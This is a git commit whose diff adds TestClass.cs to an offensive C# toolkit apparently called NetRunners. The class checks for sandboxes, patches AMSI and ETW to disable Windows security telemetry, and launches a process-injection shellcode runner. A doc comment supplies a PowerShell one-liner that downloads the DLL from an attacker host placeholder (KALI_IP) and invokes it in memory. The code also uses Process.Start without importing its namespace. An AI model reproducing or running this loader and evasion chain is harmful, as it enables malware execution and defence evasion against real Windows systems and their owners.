8869d6968740fd9e1a22319616fed1238caf3cf0
gustanini.gustanini <pimentelra10@gmail.com>
2024-04-17 02:08:13 +0200

    remove langver line from csproj, update DLL (easier to use with Dotnet2js

---
+++ NetRunnersCs/NetRunnersDll/TestClass.cs
@@ -0,0 +1,37 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using NetRunners.Heuristics;
+using NetRunners.Interfaces;
+using NetRunners.Patchers;
+using NetRunners.Runners;
+
+[ComVisible(true)]
+class TestClass
+{
+    /// <summary>
+    /// Main function for this DLL. 
+    /// Calls Heuristics and Amsi patch, then calls a runner (uncomment one and keep others commented.)
+    /// </summary>
+    /// <example>
+    /// You can run this compiled managed DLL using this powershell one-liner:
+    /// [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://KALI_IP/NetRunnersDll.dll')).GetType('NetRunnersDll.TestClass').GetMethod('TestClass').Invoke(0, $null)
+    /// </example>
+
+    public TestClass()
+    {
+        if (!SleepHeuristic.Check() || !NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
+        {
+            return; // Exit if any checks fail or patching fails
+        }
+
+        // uncomment your choice
+        IRunner runner = new ProcessInjectionRunner();
+        //IRunner runner = new DefaultRunner();
+        //IRunner runner = new ProcessInjectionRunner();
+        runner.Run();
+    }
+    public void RunProcess(string path)
+    {
+        Process.Start(path);
+    }
+}
